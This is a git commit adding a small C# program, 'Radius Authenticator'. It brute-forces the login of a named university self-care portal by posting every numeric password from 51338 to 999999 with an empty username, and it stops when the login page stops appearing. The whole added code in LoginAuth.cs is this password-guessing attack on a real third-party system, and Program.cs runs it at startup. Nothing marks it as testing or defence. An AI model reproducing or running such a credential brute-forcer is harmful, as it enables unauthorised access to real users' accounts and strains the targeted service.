f3b67e1018a15a962c24059257199a4ca17907ab
Naveed Khan <naveealikhan@outlook.com>
2017-05-13 09:49:16 +0500

    first commit

---
+++ Radius Authenticator/LoginAuth.cs
@@ -0,0 +1,86 @@
+﻿using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+namespace Radius_Authenticator
+{
+    class LoginAuth
+    {
+        private static int pass = 851450;
+        
+        public async Task<string> GetPostResponse(int i)
+        {
+            using (var client = new HttpClient())
+            {
+                var values = new Dictionary<string, string>
+                                    {
+                                        {"username","" },
+                                        {"password",i.ToString() }
+                                    };
+                var content = new FormUrlEncodedContent(values);
+                var res = await client.PostAsync("http://selfcare.bzu.edu.pk//login", content);
+                var resString = await res.Content.ReadAsStringAsync();
+                return resString;
+            }
+        }
+        public void MyFunc()
+        {
+            for (int i = 51338; i < 999999; i++)
+            {
+
+                var address = "http://selfcare.bzu.edu.pk";
+                var request = (HttpWebRequest)WebRequest.Create(address);
+                try
+                {
+                    using (var response = request.GetResponse() as HttpWebResponse)
+                    {
+                        if (request.HaveResponse && response != null)
+                        {
+                            using (var reader = new StreamReader(response.GetResponseStream()))
+                            {
+
+                                var result = reader.ReadToEnd();
+                                if (result.Contains("BZU LAN Centralized Login - BZU Multan"))
+                                {
+                                    var res = GetPostResponse(i);
+                                    if (!res.IsCompleted)
+                                    {
+                                        res.Wait();
+
+                                    }
+                                  
+
+                                }
+                                else
+                                {
+                                    Debug.WriteLine(i);
+                                    break;
+                                }
+                            }
+
+                        }
+                    }
+                }
+
+                catch (WebException wex)
+                {
+                    if (wex.Response != null)
+                    {
+                        using (var errorResponse = (HttpWebResponse)wex.Response)
+                        {
+                            using (var reader = new StreamReader(errorResponse.GetResponseStream()))
+                            {
+                                string error = reader.ReadToEnd();
+                                //TODO: use JSON.net to parse this string and look at the error message
+                            }
+                        }
+                    }
+                }
+
+            }
+        }
+    }
+}
--- Radius Authenticator/Program.cs
+++ Radius Authenticator/Program.cs
@@ -1,15 +1,14 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-
-namespace Radius_Authenticator
+﻿namespace Radius_Authenticator
 {
     class Program
     {
         static void Main(string[] args)
         {
+            LoginAuth auth = new LoginAuth();
+            auth.MyFunc();
         }
+
+
     }
 }
+
